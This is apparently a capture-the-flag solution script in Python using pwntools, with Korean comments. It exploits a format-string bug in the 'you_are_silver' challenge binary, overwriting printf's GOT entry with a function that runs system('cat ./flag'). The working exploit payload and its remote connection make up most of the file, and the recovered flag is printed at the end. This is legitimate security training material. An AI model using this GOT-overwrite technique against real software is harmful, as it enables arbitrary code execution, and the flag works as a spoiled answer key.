#! -*- coding: utf-8 -*-
from pwn import *

# 프로그램을 시작하면 문자열을 입력받고, 입력한 내용을 출력한다. 
# 일단 fsb 발생 , 64비트 라이브러리다. PIE 안걸려있는 상태. 
# 루틴상 존재하는 함수는 get_tier , play_game 인데 play_game은 호출되지 않는다.
# 근데 종료될때 왜 세그먼트 오류가 뜨지
# main+93 에서 fsb 발생 .
# main+103 에서 get_tier 함수 호출하는데, rbp-0x4 의 값을 인자로 가져온다. 
# 입력위치 0x7fffffffe360 , 해당 위치까지 44바이트 . 
# 해당 함수가 실행 될 때, 인자로 들어간 값 0x4C이상이면 4를 리턴한다. 
# 그 다음 printf 함수가 호출되는데, 이때 인자값으로 저 4를 가지고 들어가서
# 세그먼트 오류가 나는거였다. 저놈을 다른 함수로 바꿔주자.
# 이때 play_game 함수가 인자값 4인 상태로 호출되면 system("cat ./flag")
# 가 실행된다. fsb로 printf got-overwrite를 진행하자. 

#p = process("./you_are_silver")
p = remote("ctf.j0n9hyun.xyz",3022)

printf_got = 0x601028
fgets_got = 0x601030
play_game = 0x04006d7 #4196055 

payload =  "%4196045c"	
payload += "%%c%c%c"	
payload += "%c%c%c%c"	
payload += "%c%c%8ln"	#이전까지 문자열 합하면 총 14바이트. 
payload += p64(printf_got)
payload += "a"*8
#스택 시작으로부터 6번쨰 위치에 서식문자 적용.
# 근데 왜 덮어 씌우는게 안되지??
# 원인을 알았다. p32 , p64로 패킹하고 넣어주면 공백문자가 들어가서 뒷부분 출력이 짤린다.. 
# 그러면 주소를 거꾸로 뒤에 넣어주고 가보자. 8번쨰 서식문자부터 적용된다. 
# 스택 계산을 잘 해야된다. 입력 문자열들의 길이 합을 8바이트에 맞춰 넣어야 하기 때문. 
# 주소위치 오버라이트 잘 되는건 확인이 된다. 10번째 서식문자부터 적용 되는거 확인되고,
# 이 경우 스택은 총 16바이트가 선행되어 쌓여야 한다. $기호를 이용하고싶지만 10번째라서 안되더라 ㅜ 
# 마지막으로, rbp-4 위치에 0x4c가 넘는 값을 넣어준다. 

pause()
p.sendline(payload)
print p.recvline()
p.recvline()
print p.recvline()
p.interactive()

#HackCTF{N0w_Y0u_4re_b4side_0f_F4K3R}